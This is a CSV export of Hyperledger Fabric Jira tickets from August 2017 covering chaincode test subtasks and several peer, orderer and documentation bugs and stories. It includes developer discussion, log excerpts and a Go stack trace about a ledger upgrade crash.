"test marbles02 chaincode:  initMarble, readMarble, deleteMarble, getHistoryForMarble, getMarblesByRange",FAB-5790,20202,19360,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Nishi,Nishi,Nishi,16/Aug/17 3:40 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,14/Sep/17 12:41 AM,,,,,,,,,,,,0,,,,,,,,,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyd8n:",,,,,,,,,,,,,,,,,,,,,,,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,lindluni-patch-1,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,true,"17/Aug/17 6:00 AM;Nishi;submitted patchset https://gerrit.hyperledger.org/r/#/c/12493/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
test API in chaincode shim interface inside fabric using marbles02 and shimApiDriver chaincodes,FAB-5791,20203,19360,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Nishi,Nishi,Nishi,16/Aug/17 3:44 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,02/Dec/17 5:27 AM,,,,,,,,,,,,0,,,,,,,"To test shim API that is available to all chaincodes available under fabric/core/chaincode/shim/chaincode.go

We test all functions in fabric/examples/chaincode/go/marbles02 chaincode to test good portion of shim API, along with other remaining API written in custom chaincode under fabric-test/chaincodes/shimApiDriver/",,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-6437,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyd8v:",,,,,,,,,,,,,,,,,,,,,,,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,lindluni-patch-1,release-2.4,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,true,"17/Aug/17 6:00 AM;Nishi;submitted patchset https://gerrit.hyperledger.org/r/#/c/12493/;;;","09/Nov/17 5:16 AM;Nishi;New patch submitted: https://gerrit.hyperledger.org/r/#/c/15321/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Block deliver client if payload buffer is too full,FAB-5793,20206,,Bug,Closed,FAB,Fabric,software,denyeart,,,Highest,Done,yacovm,yacovm,yacovm,16/Aug/17 7:41 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,28/Aug/17 8:52 PM,v1.0.1,,,v1.0.2,v1.1.0,fabric-gossip,,,,,,0,,,,,,,"When the state module receives blocks from the orderer or from peers, it currently may throw them if it gets filled too quickly.

This has the following undesirable effect:
 if the peer in question is a leader, it would discard blocks (if it recieved too many blocks too fast from the orderer), and once it did it - it won't ever pull these blocks again until it either has to reconnect to the orderer, or if it is restarted.",,scottz,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyd9b:",,,,,,,,,,,,,,,,,,,,,,,scottz,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,release-1.0,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"16/Aug/17 8:02 AM;yacovm;https://gerrit.hyperledger.org/r/#/c/12495/;;;","24/Aug/17 7:36 AM;scottz;Surya and I have been testing this solution for this bug. Part of the solution was to read the environment configuration variable every time when AddPayload() is entered: viper.GetBool(""peer.gossip.nonBlockingCommitMode"").  In the lab, we can set CORE_PEER_GOSSIP_NONBLOCKINGCOMMITMODE to true and successfully override the fix - but only if the variable is set BEFORE we START the peer. In other words, in a production environment that is already running with this code fixed, the operations manager would have to set this to true in their shell/environment AND then stop and start each peer again. This helps, because it prevents the need to upgrade, should we wish to disable the fix.
 
I was originally expecting that we would be able to change this behavior ""on the fly"". But, the way this was implemented, I understand why that won't work; the task is started with its own copy of environment variables and changing them in the parent shell would not change it in the child shell. Thus, it makes sense in our test scenario because we spin up a docker container with a specified set of env vars, and then we start the peer from within the docker container. Even when we remote login to the docker container and set the variable, it does not change behavior because the peer has already started (and has its own copy of the original env variable which it reads repeatedly). The only way to ""change this on the fly"" would be do provide a new API - code that would modify internal variable contents, similar to how we can dynamically change the logging levels for some components.
 
Which means, if there was no intent to be able to change the variable ""on the fly"", then there was no need to read it EVERY time we enter AddPayload(). The proper implementation would have been read it once upon initialization.
 
That said, we see no harm leaving it the way it is now. And so far, our testing has not found any problems with the solution, so I cannot foresee a need to use the variable to disable his fix. That bodes well for anyone planning to completely remove this override variable in future, leaving the fix permanently in place.
 
Other observations:  * We confirmed the new code is hit only on a peer that is a gossip orgLeader, which retrieves blocks directly from an orderer.
 * Lagging nonLeader peers use the gossip state transfer protocol to request groups of up to 11 blocks from a neighboring peer. This has a flow-control mechanism built-in, as the peer would request more blocks ONLY AFTER writing the first group to the ledger.
 * We recommend that network operators set the CORE_PEER_GOSSIP_BOOTSTRAP to point to an existing stable peer, when starting the new peer. (If erroneously set to self, then that new peer would not find other peers in the org, so it would be isolated and therefore elect itself as a leader and connect to orderer). It is preferable for a new peer to be a non-leader, since its ledger would lag the other peers for possibly a considerable time (potentially hours or days, based on number of blocks on the ledger and the traffic rate) until after it slowly catches up.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
configtxlator Error in curl .../configtxlator/compute/update-from-configs,FAB-5795,20209,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,davidkhala,davidkhala,16/Aug/17 6:21 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,18/Oct/17 5:42 AM,v1.0.0,v1.0.1,,,,,,,,,,0,configtxlator,,,,,," 

 

^When I run testConfigtxlator.sh, try to compute config update, it throw out error:^

{color:#0073bf}Error with field 'original': error unmarshaling field bytes: proto: bad wiretype for field common.Config.Sequence: got wiretype 2, want 0{color}","$ configtxlator version

>>configtxlator:
 Version: 1.0.0
 Go version: go1.7
 OS/Arch: linux/amd64

[^testConfigtxlator.sh][^genesis.block]",davidkhala,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"16/Aug/17 6:17 PM;davidkhala;genesis.block;https://jira.hyperledger.org/secure/attachment/11892/genesis.block","16/Aug/17 6:17 PM;davidkhala;testConfigtxlator.sh;https://jira.hyperledger.org/secure/attachment/11893/testConfigtxlator.sh",,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyd9r:",,,,,,,,,,,,,,,,,,,,,,,davidkhala,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"17/Aug/17 4:33 PM;davidkhala; Now I know the reason, I cannot use entire block file as input for 'compute' api. Currently, only pb file encoded from partial config, in a hierarchy of .data.data[0].payload.data.config can be compared for 'compute' api.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
test chaincode_example02,FAB-5796,20212,19360,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Nishi,Nishi,Nishi,16/Aug/17 11:18 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,13/Sep/17 11:00 PM,,,,,,,,,,,,0,,,,,,,,,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyda7:",,,,,,,,,,,,,,,,,,,,,,,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"17/Aug/17 6:00 AM;Nishi;submitted patchset https://gerrit.hyperledger.org/r/#/c/12493/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
test chaincode with all mixed case chars in chaincode name during deployment,FAB-5797,20213,19360,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Nishi,Nishi,Nishi,16/Aug/17 11:20 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,14/Sep/17 12:41 AM,,,,,,,,,,,,0,,,,,,,,,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzydaf:",,,,,,,,,,,,,,,,,,,,,,,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"17/Aug/17 6:01 AM;Nishi;submitted a patchset https://gerrit.hyperledger.org/r/#/c/12493/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
 	test chaincode with all mixedcase chars in chaincode name during deployment,FAB-5798,20214,19360,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Nishi,Nishi,Nishi,16/Aug/17 11:21 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,14/Sep/17 12:41 AM,,,,,,,,,,,,0,,,,,,,,,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzydan:",,,,,,,,,,,,,,,,,,,,,,,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"17/Aug/17 6:01 AM;Nishi;submitted patchset https://gerrit.hyperledger.org/r/#/c/12493/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Command to update anchor peers missing,FAB-5799,20215,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,nickgaski,sanchezl,sanchezl,17/Aug/17 12:16 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,27/Oct/17 11:48 PM,,,,,,fabric-docs,,,,,,0,Documentation,,,,,,"The [Create & Join Channel section of the Building Your First Network|http://hyperledger-fabric.readthedocs.io/en/latest/build_network.html#create-join-channel] document is missing the command line examples for submitting the anchor peer update transactions generated in the [Manually generate the artifacts|http://hyperledger-fabric.readthedocs.io/en/latest/build_network.html#manually-generate-the-artifacts] section.",,nickgaski,sanchezl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzydav:",,,,,,,,,,,,,,,,,,,,,,,nickgaski,sanchezl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"27/Oct/17 11:48 PM;nickgaski;This has been updated now... manual instructions to join a peer from each org to the channel and then send the channel update calls to define each org's anchor peer.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Allow setting logging format on the Orderer,FAB-5800,20216,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,Asara,Asara,17/Aug/17 12:38 AM,21/Jul/18 3:48 AM,28/Oct/23 3:00 AM,02/Oct/17 8:49 PM,v1.0.1,,,v1.0.3,v1.1.0,fabric-orderer,,,,,,0,,,,,,,Currently the orderer does not seem to allow for changing the logging format.  This would be a highly appreciated feature.,,Asara,jyellick,kchristidis,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzydb3:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,Asara,jyellick,kchristidis,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,release-1.0,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"18/Aug/17 11:38 PM;jyellick;In review via: https://gerrit.hyperledger.org/r/12593;;;","03/Oct/17 1:26 AM;kchristidis;Backport fix: https://gerrit.hyperledger.org/r/14049/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
add subsection on system cc upgrade,FAB-5801,20218,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,muralisr,ChristopherFerris,ChristopherFerris,17/Aug/17 3:19 AM,23/Jan/20 7:01 AM,28/Oct/23 3:00 AM,23/Jan/20 7:01 AM,v1.0.0,,,Future,,fabric-docs,,,,,,0,stale-item,,,,,,https://lists.hyperledger.org/pipermail/hyperledger-fabric/2017-August/001621.html,,ChristopherFerris,denyeart,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzydbb:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,ChristopherFerris,denyeart,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"17/Aug/17 3:20 AM;ChristopherFerris;This would make for a nice update to the chaincode docs.;;;","24/Sep/18 5:18 AM;denyeart;Bulk Jira update:
For remaining tasks with FixVersion v1.3.0, the Reporter should update to v1.4.0 or Future, or Close.
Add a comment with any clarification needed, so that release managers can close out v1.3.0 release cleanly.;;;","09/Oct/18 11:41 PM;denyeart;[~ChristopherFerris] The link is no longer working... if this is still applicable could you find the working link...;;;","23/Jan/20 7:01 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add logging of client's ip address at the orderer deliver/broadcast,FAB-5802,20219,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,yacovm,yacovm,17/Aug/17 3:28 AM,21/Jul/18 3:49 AM,28/Oct/23 3:00 AM,22/Aug/17 4:30 AM,v1.0.1,,,v1.1.0,,fabric-orderer,,,,,,0,serviceability,Serviceability,,,,,"The orderer currently simply logs messages like:
Error reading from stream: rpc error: code = canceled desc = conext canceled

It'd be beneficial to understand who is the client that is involved in these kinds of messages.",,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzydbj:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"17/Aug/17 4:07 AM;yacovm;https://gerrit.hyperledger.org/r/#/c/12525/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Peer crashes when on top of v1.0.1 ledger,FAB-5803,20221,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Done,yacovm,yacovm,yacovm,17/Aug/17 7:33 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,20/Aug/17 3:33 AM,v1.0.1,,,v1.1.0,,fabric-ledger,,,,,,0,,,,,,,"More information TBD
{quote}
2017-08-16 21:30:06.519 UTC [gossip/state] NewGossipCoordinatedStateProvider -> INFO 028 Updating node metadata information, current ledger sequence is at = 420136, next expected block is = 420137
2017-08-16 21:30:06.522 UTC [cscc] Init -> INFO 029 Init CSCC
2017-08-16 21:30:06.522 UTC [sccapi] deploySysCC -> INFO 02a system chaincode cscc/channel12-1(github.com/hyperledger/fabric/core/scc/cscc) deployed
2017-08-16 21:30:06.523 UTC [sccapi] deploySysCC -> INFO 02b system chaincode lscc/channel12-1(github.com/hyperledger/fabric/core/scc/lscc) deployed
2017-08-16 21:30:06.523 UTC [escc] Init -> INFO 02c Successfully initialized ESCC
2017-08-16 21:30:06.523 UTC [sccapi] deploySysCC -> INFO 02d system chaincode escc/channel12-1(github.com/hyperledger/fabric/core/scc/escc) deployed
2017-08-16 21:30:06.523 UTC [sccapi] deploySysCC -> INFO 02e system chaincode vscc/channel12-1(github.com/hyperledger/fabric/core/scc/vscc) deployed
2017-08-16 21:30:06.523 UTC [qscc] Init -> INFO 02f Init QSCC
2017-08-16 21:30:06.523 UTC [sccapi] deploySysCC -> INFO 030 system chaincode qscc/channel12-1(github.com/hyperledger/fabric/core/chaincode/qscc) deployed
2017-08-16 21:30:06.523 UTC [sccapi] deploySysCC -> INFO 031 system chaincode (rscc,github.com/hyperledger/fabric/core/chaincode/rscc) disabled
2017-08-16 21:30:06.523 UTC [nodeCmd] serve -> INFO 032 Starting peer with ID=[name:""990e677022394afe8b8dc124ea17abbf-fabric-peer-org1-21020a"" ], network ID=[990e677022394afe8b8dc124ea17abbf], address=[**********]
2017-08-16 21:30:06.525 UTC [nodeCmd] serve -> INFO 033 Started peer with ID=[name:""990e677022394afe8b8dc124ea17abbf-fabric-peer-org1-21020a"" ], network ID=[990e677022394afe8b8dc124ea17abbf], address=[****************]
2017-08-16 21:30:09.434 UTC [chaincode] ExecuteChaincode -> ERRO 034 Error executing chaincode: premature execution - chaincode (sample_cc_ch12:v0) launched and waiting for registration
2017-08-16 21:30:09.434 UTC [endorser] simulateProposal -> ERRO 035 failed to invoke chaincode name:""sample_cc_ch12""  on transaction 053fcacb0b4df5ce5b9e9072708e27f447dc282541c7e88449a09a40f173ef9a, error: Error executing chaincode: premature execution - chaincode (sample_cc_ch12:v0) launched and waiting for registration
2017-08-16 21:30:12.905 UTC [gossip/state] commitBlock -> ERRO 036 Got error while committing(Expected block number=0, recived block number=420137)
2017-08-16 21:30:12.906 UTC [gossip/state] deliverPayloads -> CRIT 037 Cannot commit block to the ledger due to Expected block number=0, recived block number=420137
panic: Cannot commit block to the ledger due to Expected block number=0, recived block number=420137

goroutine 147 [running]:
panic(0x2aa35c78640, 0xc421e40350)
	/opt/go/src/runtime/panic.go:500 +0x408
github.com/hyperledger/fabric/vendor/github.com/op/go-logging.(*Logger).Panicf(0xc42019cfc0, 0x2aa35def904, 0x2b, 0xc421e40290, 0x1, 0x1)
	/root/gopath/src/github.com/hyperledger/fabric/vendor/github.com/op/go-logging/logger.go:194 +0x136
github.com/hyperledger/fabric/gossip/state.(*GossipStateProviderImpl).deliverPayloads(0xc4230ee500)
	/root/gopath/src/github.com/hyperledger/fabric/gossip/state/state.go:490 +0xac8
created by github.com/hyperledger/fabric/gossip/state.NewGossipCoordinatedStateProvider
	/root/gopath/src/github.com/hyperledger/fabric/gossip/state/state.go:230 +0xb38{quote}

",,manish-sethi,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyddr:",,,,,,,,,,,,,,,,,,,,,,,manish-sethi,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"17/Aug/17 5:27 PM;yacovm;[~manish-sethi] , [~denyeart] I could use your help here... it seems like *store_impl.go*'s *getLastCommittedBlockNum* returns true, 0
{code}
func (s *store) getLastCommittedBlockNum() (bool, uint64, error) {
	var v []byte
	var err error
	if v, err = s.db.Get(lastCommittedBlkkey); v == nil || err != nil {
		return true, 0, err
	}
	return false, decodeBlockNum(v), nil
}
{code}

And when *Prepare* happens (as part of the commit) - the *s.nextBlockNum()* would check the *s.isEmpty* and would return 0 and this would fail the commit and crash the peer.

It seems like *lastCommittedBlkkey* doesn't exist in the ledger? Previously this was something like []byte(""blkMgrInfo"") (I guess it also exists now, right?) and now the private data storage has also:
{code}
lastCommittedBlkkey = []byte{1}
{code}
?

I guess the last committed block key in the private store needs to be derived from the public ledger in case of an upgrade from a v1.0.1 ledger to a v1.1 ledger.
Is this correct or am I completely off the course? ;;;","18/Aug/17 12:50 AM;manish-sethi;[~yacovm] - yes, your finding is correct. The separate maintenance of the *lastCommittedBlkkey* for the pvt data is causing this issue. However, the solution may not be as straight as initializing this value from public block storage. This solution will work for the scenario that you are testing for i.e., initializing the peer with existing block storage from 1.0 (because, 1.0 does not contain any pvt data). But for the scenarios, where the underlying block store files are from later versions (current master?), and somehow the pvt data store is not copied over, it would lead to other complications.

 

One of the potential solutions could be to check this mismatch between *lastCommittedBlkkey* and the max block height available in the public block storage (bcInfo.Height) . If *lastCommittedBlkkey* is found behind bcInfo.Height, the blocks should be parsed to bring *lastCommittedBlkkey* up to date. However, this may require a large number of block parsing and hence some versioning scheme for block file may help in this.

 

As a short-fix, we can assume that the migration of block files with uninitialized *lastCommittedBlkkey* is because of the upgrade scenario and not because of the fact that the administrator copied block files from somewhere and forgot to copy the pvt data.

I'll fix this and submit a CR.;;;","18/Aug/17 5:24 AM;manish-sethi;Submitted a CR - https://gerrit.hyperledger.org/r/#/c/12579;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
BCCSP yaml parsing in peer should be weakly-typed,FAB-5804,20223,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,vpaprots,vpaprots,vpaprots,17/Aug/17 9:48 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,28/Sep/17 7:42 PM,v1.0.2,,,v1.0.3,,fabric-orderer,fabric-peer,,,,,1,,,,,,,"Fix BCCSP yaml parsing to be weakly-typed. Found this when 

{{BCCSP:}}
{{  PKCS11:}}
{{     SoftwareVerify: true #<< would not parse bool}}

 ",,jyellick,mastersingh24,vpaprots,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyde7:",,,,,,,,,,,,,,,,,,,,,,,jyellick,mastersingh24,vpaprots,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,release-1.0,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"14/Sep/17 11:12 PM;jyellick;Added the review-needed tag.  From the discussion on the CR:

{noformat}
Jason Yellick
Sep 9 11:46 PM
Looking at the documentation here:
https://godoc.org/github.com/mitchellh/mapstructure#DecoderConfig
It looks like this brings some other potentially undesirable behavior, in particular:
    //   - negative numbers to overflowed uint values (base 10)
    //   - slice of maps to a merged map
I'm personally a little torn.  It seems like the behavior is generally desirable, but also a little odd in some cases.  Thoughts?
{noformat}


{noformat}
Volodymyr Paprotski
Sep 11 5:16 AM
Interesting, didnt see that blurb before, thanks for the link, pretty useful.
negative numbers.. don't have anything like that today (all positive like port address. Pin is treated like a string.) So I am not necessarily opposed to that interpretation.. Thats probably the
This looks esoteric (until one needs it I suppose, when its very frustrating 'bug', but still appears a corner case. Am I wrong?)
